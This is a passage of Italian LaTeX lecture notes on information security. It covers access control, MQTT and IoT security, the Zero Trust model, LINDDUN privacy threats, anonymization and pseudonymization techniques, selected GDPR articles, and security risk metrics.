            L'\textit{Access Control} (\texttt{AC})\footnote{Come discusso nel capitolo \ref{chap:accessControl} - \nameref{chap:accessControl}} è un aspetto fondamentale per la sicurezza delle applicazioni in generale, ma è particolarmente importante per le applicazioni web. Senza un \texttt{AC} valido possono verificarsi eventi di \textit{data breach} ovvero la perdita di dati sensibili. Vedi ad esempio il caso di \textit{Equifax} nel 2017 dove sono stati rubati i dati di 147 milioni di utenti come: patenti di guida, numeri di previdenza sociale, date di nascita e indirizzi, foto e molto altro. 
        \subsubsection{\textit{Broken Access Control}}
            Gli \texttt{AC} in generale devono seguire sempre il principio di "\textit{least privilege}" in questo modo anche se le credenziali di un utente vengono compromesse solo le informazioni a lui legate lo sono, nel caso di \textit{equifax} se fosse stato applicato il principio di \textit{least privilege} il danno sarebbe stato molto minore in quanto solo le informazioni legate a quel utente sarebbero state compromesse, e non l'intero \textit{database} di una compagnia da 147 milioni di utenti.
\section{IoT Security}
    \subsection{Il modello \textit{publish}/\textit{subscribe} }
        Dato che il modello \textit{client}/\textit{server} prevede un \textit{client} inizializzi la comunicazione, rendendo questo un modello del tipo \texttt{pull} per i dispositivi \texttt{IoT} che spesso hanno poche risorse e quindi non possono inizializzare la comunicazione. Per questo motivo si è sviluppato il modello \textit{publish}/\textit{subscribe} che permette ai dispositivi di pubblicare i dati raccolti ed ai \textit{server} di sottoscriversi a questi dati. Questo modello basato sul principio \textit{many-to-many} permette di avere una comunicazione \texttt{push} e non \texttt{pull} come nel modello \textit{client}/\textit{server}. Inoltre sia lo \textbf{spazio} che il \textbf{tempo} sono \textit{de-coupled} ovvero non è più necessario che tutti le parti conoscano tutti i messaggi, solo le parti interessate ricevono i messaggi (\textit{space decoupling}), inoltre non è necessario che una parte partecipi attivamente allo stesso tempo in quanto i messaggi sono inviati tramite una terza parte (\textit{time decoupling}). Come ulteriore aggiunta il modello \textit{publish}/\textit{subscribe} permette di avere sia una comunicazione basata sul \texttt{push} che sul \texttt{pull}.
        \subsubsection{Pattern di comunicazione} 
            Per funzionare il modello sfrutta tre entità:
                \begin{description}
                    \item[\textit{Publisher}] Colui che pubblica i dati sotto forma di eventi
                    \item[\textit{Subscriber}] Colui che si sottoscrive agli eventi
                    \item[\textit{Event Notification System} \texttt{ENS}] Il sistema che gestisce la comunicazione tra \textit{Publisher} e \textit{Subscriber}
                \end{description}
            Gli \textbf{eventi} rappresentano un informazione strutturata che segue un \textit{event schema} definito a priori ed statico. Nello schema sono definiti un insieme di attributi ognuno di quali costituito da un nome e da un tipo di dato.
        \subsubsection{Sottoscrizioni}
            Le sottoscrizioni sono il meccanismo tramite il quale un particolare \textit{subscriber} notifica al \texttt{ENS} l'interesse verso un particolare evento. Le sottoscrizioni sono delle costanti espresse sul \textit{event schema}. Una volta registrata il \texttt{ENS} notificherà un evento $e$ al \textit{subscriber} $x$ se e solo se i valori definiti nell'evento $e$ sono compatibili con i valori definiti in una delle sottoscrizioni $s$ di $x$.\newline
            Le sottoscrizioni possono essere di vario tipo: \textit{Topic-based}, \textit{Content-based}, \dots
            \paragraph{Sottoscrizioni \textit{Topic-based}} Le sottoscrizioni \textit{Topic-based} si basano sul \textit{topic} dell'evento. È vero che sui \textit{server} spesso le informazioni non sono strutturate ma ad ogni evento viene associato un "\textit{tag}" corrispondente all'identificatore del \textit{topic} nel quale è stato pubblicato. Un \textit{subscriber} può rilasciare una sottoscrizione su uno o più \textit{topic} specifici e riceverà solo gli eventi pubblicati su quei \textit{topic}.
            \paragraph{Sottoscrizioni \textit{Hierarchy-based}} Le sottoscrizioni \textit{Hierarchy-based} sono simili alle \textit{Topic-based} ma a differenza di queste ultime i \textit{topic} sono organizzati seguendo una struttura gerarchica e nel momento in cui un \textit{subscriber} si sottoscrive ad un \textit{topic} riceverà tutti gli eventi pubblicati su quel \textit{topic} e su tutti i \textit{sotto-topic} figli di quel \textit{topic}.\footnote{I \textit{sotto-topic} sono a loro volta dei \textit{topic} veri e propri, a meno del livello di gerarchia questi sono identici ai \textit{topic} principali e quindi ci si può sottoscrivere anche a questi come se fossero \textit{topic} principali.}
    \subsection{\texttt{MQTT}}
        \texttt{MQTT} (\textit{Message Queue Telemetry Transport}) è un protocollo di messaggistica leggero e scalabile che si basa sul modello \textit{publish}/\textit{subscribe}. Questo protocollo è stato progettato per essere utilizzato in ambienti con limitate risorse o reti a piccola-banda/alta latenza come ad esempio le reti \texttt{IoT}. \texttt{MQTT} è un protocollo \textit{stateless} che minimizza l'uso della banda e richiede pochissime risorse lato \textit{hardware} e \textit{software}. 
        \paragraph{Funzionamento}
            \begin{itemize}
                \item Il \textbf{publisher} pubblica un messaggio su uno o più \textit{topic} all'interno del \textit{broker}.
                \item Il \textbf{subscriber} si sottoscrive ad uno o più \textit{topic} all'interno del \textit{broker} e riceve tutti i messaggi inviati dal \textit{publisher} su quel \textit{topic}.
                \item Il \textbf{broker} è il server che gestisce la comunicazione tra \textit{publisher} e \textit{subscriber}.
                \item Il \textbf{topic} consiste in uno o più livelli di gerarchia separati da uno \textit{slash} (\texttt{/}).
            \end{itemize}
        \paragraph{Sicurezza ?} \texttt{MQTT} è un protocollo molto leggero e scalabile ma non è molto sicuro, da specifiche è possibile passare un \textit{username} ed una \textit{password} all'interno di un pacchetto \texttt{MQTT} e la comunicazione può essere cifrata tramite \texttt{TLS}, ma questa deve essere gestita indipendentemente da questa. Inoltre \texttt{MQTT} per rimanere leggero non implementa della sicurezza a livello di \textit{broker} e quindi è necessario implementare delle misure di sicurezza aggiuntive.
        \paragraph{\texttt{MQTT} e credenziali} \texttt{MQTT} permette di passare le credenziali all'interno del pacchetto \texttt{MQTT} ma queste sono in chiaro e quindi possono essere intercettate da una qualsiasi persona all'interno della rete. Inoltre il pacchetto di risposta contiene direttamente se le credenziali sono corrette o meno e quindi un attaccante può facilmente ottenere le credenziali di un utente.

\section{Il modello \textit{Zero Trust}}
    Il modello \textit{zero trust} prevede che nessuna entità all'interno di una rete debba essere considerata attendibile e che ogni entità debba essere verificata prima di poter accedere ad una risorsa. Il modello prevede che ogni sistema aziendale sia considerato una risorsa, e quindi a rischio, inoltre ogni comunicazione deve essere effettuata in maniera sicura indipendentemente dalla rete. Inoltre gli accessi alle risorse individuali è garantito solo per-connessione, ovvero per ogni connessione l'utente deve autenticarsi con una autenticazione dinamica e stretta. Le policy per le quali un utente può accedere sono determinate da proprietà sia dell'utente che in base a proprietà di ambiente.
    \subsection{I 6 pilastri del modello \textit{zero trust}}
        Il modello \textit{zero trust} fondato sull'identificazione delle risorse, degli utenti e dei \textit{workflow} prevede l'identificazione di un \textit{workflow} candidato e basandosi su \textit{assets} e \textit{user} coinvolti sviluppa una serie di \textit{access policy} per quel \textit{workflow}. Inoltre monitora e sviluppa le \textit{policies}.
        \subsubsection{Pilastro 1 - \textit{Users}}
            Il primo pilastro del modello \textit{zero trust} è l'identificazione e la continua autenticazione degli utenti, sia che questi siano fidati che meno.\newline
            Questo pilastro comprende l'uso di tecnologie quali l'identità, la gestione degli accessi e l'autenticazione multi-fattore\footnote{Come discusso nella sezione \ref{sec:mfa} - \nameref{sec:mfa}}. Infine è necessario che le informazioni e interazioni degli utenti siano protette e monitorate, per questo sono importanti tecnologie come \texttt{TLS}\footnote{Vedi il capitolo \ref{ch:PIK-TLS} - \nameref{ch:PIK-TLS}} e \texttt{SSL}.
        \subsubsection{Pilastro 2 - \textit{Devices}}
            Il secondo pilastro sono i dispositivi, è importante monitorate in tempo reale la sicurezza di questi. In particolare un "registro di device" per tenere traccia di tutti i dispositivi connessi alla rete e/o dei quali ci si fida. Esistono soluzioni se una policy del tipo "\textit{bring your device}" ovvero permettere ai dipendenti di portare i propri dispositivi personali in azienda, in questo caso è necessario che i dispositivi siano monitorati e che siano conformi alle policy aziendali, questo magari grazie a soluzioni di \textit{Mobile Device Manager}.
        \subsubsection{Pilastro 3 - \textit{Network}}
            Nel modello \textit{zero trust} l'infrastruttura tradizionale che prevede un \textit{firewall} ed un perimetro non è più sufficiente. In quanto chi risiede all'interno del perimetro del \textit{firewall} si muove molto più vicino ai dati allora è necessario che questi siano micro-segmentati per aumentare la protezione ed il controllo. Inoltre è di criticale importanza un controllo gerarchico e basato su privilegi dell'accesso alla rete, inoltre i flussi interni ed esterni devono essere monitorati e controllati. Bisogna prevenire "movimenti laterali" ovvero il movimento di un attaccante all'interno della rete. Infine le decisioni di accesso alla rete non devono essere prese staticamente ma dinamicamente in base a variabili come il contesto, la situazione e al traffico.
        \subsubsection{Pilastro 4 - \textit{Applications}}
            Anche l'\textit{application layer} costituito da micro-servizi e macchine virtuali deve essere centralizzato e protetto. Bisogna essere in grado di identificare e controllare le tecnologie usate nello \textit{stack} in modo da poter prendere decisioni più accurate e sicure.\newline
            L'autenticazione a più fattori in questo pilastro è fondamentale, questa accoppiata ad un controllo di accesso basato su \textit{policy} appropriate ed efficaci permette di proteggere le applicazioni e i dati.
        \subsubsection{Pilastro 5 - \textit{Automation}}
            L'automazione è un aspetto fondamentale del modello \textit{zero trust} in quanto permette di ridurre il rischio di errore umano e di velocizzare le operazioni per il controllo e la gestione della sicurezza della rete.\newline
            vengono istituiti degli \textit{Security Operation Centers} \texttt{SOCs} atti alla creazione di strumenti per la gestione delle informazioni di sicurezza, per la gestione degli eventi, e per lo studio del comportamento di utenti e entità. Sono stati sviluppati degli strumenti detti \textit{Security Orchestration} che connettono questi strumenti e ne permettono la gestione centralizzata.
        \subsubsection{Pilastro 6 - \textit{Analytics}}
            L'analisi dei dati è un aspetto fondamentale del modello \textit{zero trust} in quanto non è possibile combattere una minaccia che non è possibile vedere o comprendere. Risulta quindi cruciale fare leva su strumenti quali: \begin{enumerate}
                \item \textit{Security Information Management} 
                \item \textit{Advanced Security Analytics Platforms}
                \item \textit{Security User Behavior Analytics}
                \item ed altri strumenti di analisi dei dati che permettano agli esperti di osservare in tempo reale il comportamento degli utenti e delle entità all'interno della rete. Ciò in modo da orientare difese più efficaci e mirate.
            \end{enumerate}
    \subsection{Stabilire la "fiducia" in un modello senza fiducia}
        Come stabiliamo che un utente o un dispositivo è attendibile in un modello \textit{zero trust} ?\newline
        La fiducia viene stabilita in base alle esigenze organizzative ed al focus che si vuole dare alla sicurezza. In ambienti dove il modello è applicato la fiducia viene stabilita in base principalmente a tre fattori: \begin{enumerate}
            \item \textit{User} - L'identità dell'utente e le sue credenziali
            \item \textit{Device} - Il dispositivo da cui l'utente si connette
            \item \textit{Application} - L'applicazione alla quale l'utente vuole accedere
        \end{enumerate}
        Da questi tre il "motore di fiducia" determina un punteggio di fiducia dal quale si basano le \textit{policies} per l'accesso alle risorse. Una risorsa più sensibile richiederà un punteggio di fiducia più alto rispetto ad una risorsa meno sensibile.
    \chapter{Privacy and Data Protection}
\thispagestyle{chapterInit}

\section{\textit{On Privacy}}
    \subsection{Definizioni}
        Informalmente possiamo definire la privacy con il principio di auto-determinazione, ovvero ognuno ha il diritto di controllare le informazioni che lo riguardano.\newline
        Questo principio implica diversi possibilità di gestire le nostre informazioni:
        \begin{itemize}
            \item Chi ha diritto a vedere cosa (Riguarda \texttt{AC})
            \item Chi ha diritto a usare cosa (Riguarda \texttt{UC})
            \item Per che cosa possono usarlo (Riguarda \texttt{PC})
            \item A chi possono trasferirlo (Riguarda \texttt{DTC})
            \item \dots
        \end{itemize}
        Garantire tutti queste possibilità di controllo è molto difficile in quando correlare i dati e/o azioni è molto complesso. Questo però significa che esiste ancora qualche possibilità di mantenere l'anonimato anche se può essere molto difficile.
        \paragraph{\textit{Security} vs \textit{Privacy}}
        La \textit{security} e la \textit{privacy} sono due concetti che possono apparentemente sembrare simili ma che in realtà condividono solo una piccola porzione di concetti in comune. Infatti queste hanno in comune lo scopo di proteggere le informazioni personali, ma la \textit{security} si occupa anche della triade \texttt{CIA}\footnote{Confidentiality, Integrity, Availability, vedi \ref{sec:ciaTriad} - \nameref{sec:ciaTriad}} mentre la \textit{privacy} si occupa inoltre dell'uso e visualizzazione delle informazioni in maniera corretta, della raccolta e qualità dei dati e informazioni personali e della loro gestione.
    \subsection{L'acronimo \texttt{LINDDUN}}
        L'acronimo \texttt{LINDDUN} sta per:
        \begin{itemize}
            \item \textbf{Linkability}
            \item \textbf{Identifiability}
            \item \textbf{Non-repudiation}
            \item \textbf{Detectability}
            \item \textbf{Disclosure of information}
            \item \textbf{Unawareness}
            \item \textbf{Non-compliance}
        \end{itemize}
        Questo acronimo è stato creato per definire i principi fondamentali della privacy e della protezione dei dati.
        \subsubsection{Linkability}
            La \textit{linkability} è la capacità di distinguere se due o più \textbf{elementi di interesse} (\textit{Items of Interest} - \texttt{IoI}) sono correlati o meno tra loro senza conoscere l'identità del soggetto al quale sono associati. Esempio di questo può essere: la cronologia di navigazione di uno stesso utente, le entry su tabelle diverse collegate ad uno stesso utente, \dots\newline
            Come conseguenza sussiste la possibilità che venga compromessa l'identità (e il principio di \textit{identifiability}) quando troppe informazioni sono collegate tra loro. Inoltre c'è il rischio di inferenza (o \textit{inference}), questo nel caso nel quale un gruppo di informazioni è associabile, il che può comportare a discriminazioni o \textit{targeting} verso (ad esempio) un particolare gruppo di persone che vive in una determinata zona.
        \subsubsection{Identifiability}
            L'\textit{identifiability} è la capacità di identificare un particolare soggetto tra un gruppo di soggetti anonimi, questo se non si riesce a nascondere il collegamento tra l'identità di un soggetto ed un \texttt{IoI}. Ad esempio: riuscire ad identificare chi è il lettore di una pagina web, oppure a chi si riferiscono i dati di una tabella. Conseguenza della mancata protezione del principio di \textit{identifiability} è la presenza di gravi violazioni della \textit{privacy}.
        \subsubsection{Non-repudiation}
            La \textit{non-repudiation} è la capacità di garantire che un soggetto non possa negare di aver compiuto una determinata azione. Questo principio è molto importante in ambito legale, in quanto se un soggetto non può negare di aver compiuto una determinata azione, allora è possibile dimostrare che ha compiuto un'azione illecita. Questo principio è molto importante in ambito di \textit{e-commerce} e \textit{e-government} ovvero nel caso di votazioni \textit{on-line} o di contratti stipulati \textit{on-line}. Come conseguenza se viene violato un \textit{dataset} con all'interno delle prove che un soggetto è un informatore di un'organizzazione, allora questo può comportare gravi conseguenze per la persona coinvolta.
        \subsubsection{Detectability}
            La \textit{detectability} è la capacità di distinguere se una \texttt{IoI} esiste o meno. Questo determina che un attaccante conosce o meno se l'informazione è contenuta in un determinato \textit{dataset}. Questo principio è molto importante in ambito di \textit{data mining} è possibile infatti dedurre certe informazioni senza avere accesso ad esse.
        \subsubsection{Disclosure of information}
            Ovvero la perdita di \textit{confidentiality}. Vedi \ref{sec:ciaTriad} - \nameref{sec:ciaTriad}.
        \subsubsection{Unawareness}
            La \textit{unawareness} è la mancata consapevolezza degli effetti della condivisione di una informazione. Questo principio è molto importante in ambito di \textit{social network} in quanto spesso non si è consapevoli delle conseguenze della condivisione di determinate informazioni quali ad esempio carte fedeltà, servizi online, \dots\newline
            Idealmente ogni utente deve essere consapevole degli effetti della condivisione di tali informazioni verso terzi. Più informazioni sono disponibili più queste sono associabili.
        \subsubsection{Non-compliance}
            La \textit{non-compliance} è la mancata osservanza delle regole di protezione della privacy. Questo porta a multe e/o perdita di credibilità per l'organizzazione che non rispetta le regole di protezione della privacy.
        
        \begin{figure}[H]
            \centering
            \includegraphics[width=0.6\textwidth]{09/LINDDUN-mitigazioni.png}
            \caption{Mitigazioni per i principi di \texttt{LINDDUN}}
        \end{figure}
\section{On Anonymization}
    \subsection{Anonimizzazione e attacchi basati su \textit{linkability}} 
        \subsubsection{Anonimizzazione dei dati}
            L'anonimizzazione è definita come il processo di rimozione delle \texttt{PII} - \textit{Personally Identifying Information} come ad esempio: nome, cognome, indirizzo, \dots\newline
            Il problema sussiste che a lato pratico/tecnico \texttt{PII} non ha una definizione precisa. È definito invece cosa fare quando è persa l'anonimato di quella informazione: contattare l'utente, notificare l'incidente, \dots\newline
            Nell'avvento di un \textit{data-leak} qualsiasi tipo di informazione può essere considerata \texttt{PII}.\footnote{Vedi Netflix \textit{data-leak} del 2006. \href{https://www.cs.utexas.edu/~shmat/netflix-faq.html}{Studio del \textit{data-leak} di Netflix - Università del Texas}}
        \subsubsection{Attacchi basati su \textit{linkability}}
            Gli attacchi basati su \textit{linkability} sono attacchi che sfruttano la correlazione tra due o più \texttt{IoI} anche presi da dataset diversi. Questo tipo di attacchi sono molto pericolosi in quanto possono compromettere la privacy di un utente. Alcune volte inoltre per legge è richiesto che vengano pubblicati i dati in forma anonima, spesso incrociando questi dati con altri dataset è possibile risalire a delle informazioni riguardanti questa persona, e nel caso peggiore risalire all'identità di questa persona.\newline
            Ciò accade in quanto spesso nei \textit{dataset} resi pubblici gli attributi demografici quali ad esempio: età, sesso, \texttt{CAP}, \dots sono presenti e possono essere utilizzati per incrociare i dati e risalire all'identità di una persona. Gli attributi quali data di nascita, sesso, \texttt{CAP} sono chiamati \textit{Quasi-identifiers} e anche se non sono direttamente identificativi, possono essere utilizzati per scoprire ulteriori informazioni su quella persona e eventualmente risalirne all'identità. Pubblicare un \textit{dataset} anonimo con dei \textit{Quasi-identifiers} è molto pericoloso e spesso è equivalente a pubblicare un \textit{dataset} non anonimo. Dati sensibili non dovrebbero \textbf{mai} essere pubblicati con dei \textit{Quasi-identifiers}, ne tanto meno con attributi chiave.
        \subsubsection{Mitigazione attacchi \textit{linkability} - $k$-anonymity}
                Pubblicare un dataset $k$-anonimo significa che ogni persona non può essere distinta da almeno $k-1$ altri individui diversi. Quindi ogni insieme di \textit{Quasi-identifier} appare almeno $k$ volte all'interno di uno stesso \textit{dataset}. 
            \paragraph{Come ottenere $k$-anonimità}
                Per ottenere $k$-anonimità si può agire in due modi distinti: \textbf{generalizzazione} e \textbf{soppressione} degli attributi.
                \subparagraph{Generalizzazione} La generalizzazione consiste nel sostituire un attributo con un suo super-insieme (es: Se l'età è 25, generalizzarla a 20-30 o 2*).
                \subparagraph{Soppressoione} La soppressione consiste nel rimuovere un attributo dal dataset. Queste due tecniche possono essere utilizzate insieme per ottenere $k$-anonimità.
    \subsection{Pseudo-anonimizzazione}
        La pseudo-anonimizzazione è una tecnica che consiste nel sostituire i dati identificativi con altri. Questo però può tenere traccia dell'identità originale di una persona e sussiste il rischio che un soggetto venga identificato tramite attacchi di \textit{re-identification}, come gli attacchi basati su \textit{linkability}. In certe situazioni gli pseudonimi possono contenere loro stessi delle informazioni sulla persona, quali ad esempio: l'anno di nascita è contenuto nel codice fiscale. Da questo punto di vista è importante che gli pseudonimi siano generati in modo che questi siano resilienti a \textit{data-loss} e \textit{data-leak}.
        \subsubsection{Definizione di fuzioni di pseudonimizzazione}
            Una ``Funzione di pseudonimizzazione'' è una funzione che ``mappa'' un dato identificativo in uno pseudonimo. Questa funzione ha come requisito che se $d1$ e $d2$ sono due dati distinti, allora $f(d1)=pseudo1 \neq pseudo2=f(d2)$. Questo in quanto la funzione che ritorna il dato identificativo (funzione inversa) deve essere in grado di ritornare il dato originale senza ambiguità. Questo non esclude che uno stesso dato non possa essere associato a più pseudonimi. In ogni caso esistono delle informazioni che servono ad associare uno pseudonimo ad un dato, le quali vengono chiamate \textbf{\textit{pseudonymisation secret}} e devono essere protette in modo che non possano essere associate ad un dato. La forma più semplice di \textit{pseudonymisation secret} è una tabella di ``mapping'' tra dati e pseudonimi.
        \subsubsection{Inplementazione di funzioni di pseudonimizzazione} 
            Le funzioni di pseudonimizzazione possono essere implementate in diversi modi, tra i quali:
            \begin{description}
                \item[Counter] Gli identificatori sono sostituiti con un numero, il quale viene incrementato ogni volta che viene generato uno pseudonimo. Questo metodo è molto semplice ma non è sicuro. La non-sicurezza di questo metodo è data dalla poca scalabilità per grandi \texttt{DB} e dal fatto che l'ordine può dare informazioni sull'ordine delle informazioni.
                \item[Generatore di numeri casuali] Gli identificatori sono sostituiti con numeri casuali. Questo metodo è più sicuro del precedente ma è difficile da implementare evitando ripetizioni senza memorizzare i numeri generati.
                \item[Funzioni di \textit{Hash}] Il \textit{digest} dell'identificativo è lo pseudonimo generato. Questo metodo è considerato inadeguato in quanto non è reversibile ed è soggetto ad attacchi di \textit{brute force} e \textit{dictionary attack}.
                \item[Encryption] L'identificativo è cifrato tramite cifrari a blocchi come \texttt{AES} o \texttt{DES}. In questo metodo la chiave usata per cifrare i dati è usata sia come \textit{pseudonymisation secret} che come \textit{recovery secret}. Viene usato il meccanismo di \textit{padding} in quanto gli identificativi spesso sono più piccoli della dimensione del blocco.
            \end{description} 
\section{\texttt{GDPR} - \textit{General Data Protection Regulation}}
    \subsection{In generale}
        La \textit{privacy} dei dati in europa è regolamentata dal \texttt{GDPR} - \textit{General Data Protection Regulation}. Questo regolamento è entrato in vigore il 25 Maggio 2018, questo in modo che sia una unica legge europea a trattare in materia di protezione dei dati. Il \texttt{GDPR} include: \begin{itemize}
            \item \textit{Safeguarding} dei dati.
            \item Modalità e forme di ottenimento del consenso da parte dell'utente.
            \item Identificazione delle leggi applicabili all'organizzazione sulla base dei dati trattati.
            \item Formazione dei dipendenti sull'uso dei dati, sulla sicurezza e sulla privacy.
        \end{itemize}
        Il \texttt{GDPR} protegge tutti i cittadini europei non facendo distinzione sul dove l'organizzazione raccoglie e conserva i dati. Inoltre il \texttt{GDPR} prescrive che in caso di \textit{data leak} che l'autorità competenti e gli utenti siano informati entro 72 ore dal \textit{data leak}. Se non si rispettano le normative del \texttt{GDPR} si rischiano multe fino al 4\% del fatturato annuo dell'organizzazione o fino a 20 milioni di euro.
    \subsection{Articoli selezionati}
        Nota dell'autore: \begin{quote}``Mi sono permesso di tradurre liberamente gli articoli selezionati e di riportare solo una parte di essi la quale ritengo essere la più importante per la comprensione del \texttt{GDPR} in funzione dello svolgimento del corso (e del superamento dell'esame). Tuttavia ciò non significa che il presente materiale sia completo e/o sufficiente a tali fini.''\end{quote}
        \subsubsection{Articolo 4: Definizioni}
            Questo articolo definisce le definizioni principali del \texttt{GDPR} quali:
            \begin{description}
                \item[\textit{Personal Data}] Qualsiasi informazione che identifica o può identificare una persona fisica direttamente o indirettamente.
                \item[\textit{Processing}] Qualsiasi operazione o insieme di operazioni effettuate su un dato personale o insieme di dati personali, sia che questo sia effettuato in modo automatizzato o meno, questo include: raccolta, consultazione, uso, divulgazione, \dots
                \item[\textit{Pseudonymisation}] Qualsiasi operazione sui dati personali in modo che tale dato non può più essere attribuito ad una persona senza l'uso di informazioni aggiuntive.
                \item[\textit{Controller}] La persona fisica o giuridica, l'autorità pubblica, l'agenzia o qualsiasi altro organismo che determina le finalità e i mezzi del trattamento dei dati personali. (In italia: \textit{Responsabile del trattamento})
                \item[\textit{Processor}] La persona fisica o giuridica, l'autorità pubblica, l'agenzia o qualsiasi altro organismo che tratta i dati personali per conto del \textit{controller}.
                \item[\textit{Consento}] Qualsiasi manifestazione di volontà libera, specifica, informata e inequivocabile della persona interessata con la quale questa accetta, mediante una dichiarazione o un'azione positiva, che i dati personali che la riguardano siano trattati.
                \item[\textit{Personal Data Breach}] Una violazione della sicurezza che comporta la distruzione, la perdita, l'alterazione, la divulgazione non autorizzata di dati personali trasmessi, conservati o altrimenti trattati.
            \end{description}
        \subsubsection{Articolo 7 - Condizioni per il consenso}
            \begin{enumerate}
                \item Dove il trattamento si basa sul consenso, il controller deve essere in grado di dimostrare che la persona interessata ha acconsentito al trattamento dei suoi dati personali.
                \item $\left[ \dots \right]$ le richieste per il consenso devono essere presentate in maniera tale che questa sia chiaramente distinguibile da altre questioni, in un modo intelligibile e di facile accesso, usando un linguaggio chiaro e semplice. Qualsiasi parte del consenso che non sia chiara o comprensibile non è valida.
                \item Il soggetto dei dati deve avere il diritto di ritirare il consenso in qualsiasi momento. $\left[ \dots \right]$ Il ritiro del consenso deve essere semplice quanto l'ottenimento di tale.
            \end{enumerate}
        \subsubsection{Articolo 32 - Sicurezza del trattamento}
            \begin{enumerate}
                \item Tenendo conto dello \textbf{stato dell'arte}\footnote{Per chi non lo sapesse (trai quali io stesso prima di ricercarlo), lo \textit{stato dell'arte} è il livello di conoscenza e di tecnologia raggiunto in un determinato campo di ricerca scientifica o tecnologica. In questo caso si riferisce allo stato della tecnologia informatica e della sicurezza informatica.} e \textbf{dei costi di implementazione}, nonché della natura, dell'ambito, del contesto e delle finalità del trattamento, nonché dei rischi, di varia probabilità e gravità, \textbf{per i diritti e le libertà delle persone fisiche}, il \textit{controller} e il \textit{processor} devono attuare misure \textit{tecniche e organizzative adeguate per garantire un livello di sicurezza adeguato al rischio}, compreso, tra l'altro, 
                    \begin{enumerate}
                        \item la \textbf{pseudonimizzazione} e la \textbf{cifratura} dei dati personali;
                        \item la capacità di garantire la \textbf{riservatezza}, \textbf{l'integrità}, \textbf{la disponibilità} e la \textbf{resilienza} dei sistemi e dei servizi di trattamento;
                        \item $\left[ \dots \right]$
                    \end{enumerate}
                \item Nell'assegnazione del livello di sicurezza appropriato deve esserne tenuto conto del \textbf{rischio presentato dal \textit{processing}} $ \left[ \dots \right] $.
            \end{enumerate}
        \subsubsection{Articolo 33 - Notifica di una violazione dei dati personali al \textit{supervisory authority}}
            \begin{enumerate}
                \item Nel caso di un \textit{leak} delle informazioni personali, \textbf{il \textit{controller} dovrà notificare senza indugi, ritardi e, dove possibile, al più dopo 72 ore essere venuto a conoscenza del fatto} alla \textit{supervisory authority} competente della violazione $[\dots]$ a meno che la violazione non sia improbabile che comporti un rischio per i diritti e le libertà delle persone fisiche $[\dots]$.
                \item $[\dots]$
                \item La notifica citata al paragrafo \texttt{1} deve almeno:
                    \begin{enumerate}
                        \item Descrivere la natura della violazione, includendo se possibile, la categoria, il numero stimato $[\dots]$
                        \item $[\dots]$
                        \item Descrivere le conseguenze probabili della violazione
                        \item Descrivere le misure adottate o proposte dal \textit{controller} per affrontare la violazione, comprese, se del caso, le misure per mitigare i suoi effetti negativi.
                    \end{enumerate}
                \end{enumerate}
        \subsubsection{Articolo 34 - Comunicazione della violazione dei dati personali all'interessato}
            \begin{enumerate}
                \item Quando la violazione di dati personali è \textbf{probabile che risulti in un alto rischio per i diritti e le libertà delle persone fisiche}, il \textit{controller} deve comunicare la violazione dei dati personali all'interessato senza indugi.
                \item La comunicazione descritta dal paragrafo \texttt{1} del presente articolo deve descrivere in maniera chiara ed usando linguaggio naturale la natura $[\dots]$
                \item La comunicazione descritta dal paragrafo \texttt{1} del presente articolo non è richiesta se:
                    \begin{enumerate}
                        \item il \textit{controller} ha implementato misure tecniche e organizzative adeguate $[\dots]$
                        \item il \textit{controller} ha adottato misure successive che assicurano che il rischio per i diritti e le libertà delle persone fisiche è improbabile che si verifichi.
                        \item $[\dots]$
                    \end{enumerate}
            \end{enumerate}
        \subsubsection{Articolo 35 - Valutazione dell'impatto sulla protezione dei dati}
            \begin{enumerate}
                \item Quando un tipo di trattamento, in particolare utilizzando nuove tecnologie e tenendo conto della natura, dell'ambito, del contesto e delle finalità del trattamento, è suscettibile di comportare
                elevato rischio per i diritti e le libertà delle persone fisiche, il responsabile del trattamento deve, prima, effettuare una valutazione dell'impatto del trattamento previsto e poi operare sulla protezione dei dati personali. $[\dots]$
                \item $[\dots]$
                \item Un \textit{data protection impact assessment} descritto nel paragrafo 1 deve essere richiesto nel caso di:
                    \begin{enumerate}
                        \item valutazione sistematica e approfondita di aspetti personali relativi a persone fisiche basata su trattamento automatizzato, compresa la profilazione, e sulla quale si basa la decisione che produce effetti giuridici o che incide significativamente su di essa;
                        \item trattamento su larga scala di categorie particolari di dati come dall'Articolo 9(1) o da dati personali riguardanti condanne penali e alto citate nell'Articolo 10
                        \item $[\dots]$
                    \end{enumerate}
                \item $[\dots]$
                \item $[\dots]$
                \item $[\dots]$
                \item La valutazione deve contenere almeno:
                    \begin{enumerate}
                        \item $[\dots]$
                        \item $[\dots]$
                        \item Una valutazione del rischio verso i diritti e le libertà dei soggetti dei dati riferiti al paragrafo 1; $[\dots]$
                        \item $[\dots]$
                    \end{enumerate}
            \end{enumerate}
\section{\textit{Risk Evaluation}}
    \subsection{Concetti Base e Definizione di Metriche}
        \paragraph{Misura - \textit{MEASURE}}
            Una misura è un attributo concreto e oggettivo come la lunghezza, il peso, la temperatura, \dots
        \paragraph{Metrica - \textit{METRIC}}
            Una metrica, d'altro canto, è un attributo astratto e soggettivo il quale è approssimato raccogliendo e analizzando un insieme di misure. Esempio di metrica può essere come un sistema di una azienda è resistente o sicuro rispetto a minacce esterne.
        \subsubsection{Livelli di metriche e accuratezza} 
            \paragraph{Livelli} 
                Ogni organizzazione dovrebbe avere più livelli di metriche, ognuna delle quali rivolta ad un particolare tipo di pubblico, in modo che ognuno, sulla base del suo inquadramento, riesca a capire il livello di rischio. Vengono stilate solitamente $2$ livelli di metriche: 
                \begin{description}
                    \item[Basso Livello] Metriche per prendere decisioni ``tattiche'', ovvero decisioni che riguardano il breve periodo.
                    \item[Altro livello] Metriche per prendere decisioni ``strategiche'', ovvero decisioni che riguardano il lungo periodo.
                \end{description}
                Le metriche di basso livello sono usate come input per le metriche di altro livello.
            \paragraph{Accuratezza}
                L'accuratezza direttamente, in primo luogo, dall'accuratezza della misura. Questo può generare diversi problemi una volta che la metrica è stata ricavata quali: \begin{description}
                    \item[Definizione Imprecisa] Se la definizione della metrica è imprecisa, allora la metrica sarà imprecisa.
                        \subitem la \% di macchine con \texttt{OS} completamente aggiornati: includiamo solo le \textit{patch} del \texttt{OS} o anche quelle dei servizi e/o applicazioni? Inoltre cosa intendiamo per ``completamente aggiornato'' solo installate oppure anche riavviate e le \textit{patch} applicate?
                    \item[Terminologia Ambigua] Se la terminologia usata è ambigua, allora la metrica sarà ambigua.
                        \subitem il numero di porte scansionate, se un attaccante scansione 100 host differenti lo consideriamo uno o 100 scan?
                    \item[Misure inconsistenti] Se le misure sono inconsistenti, allora la metrica sarà inconsistente.
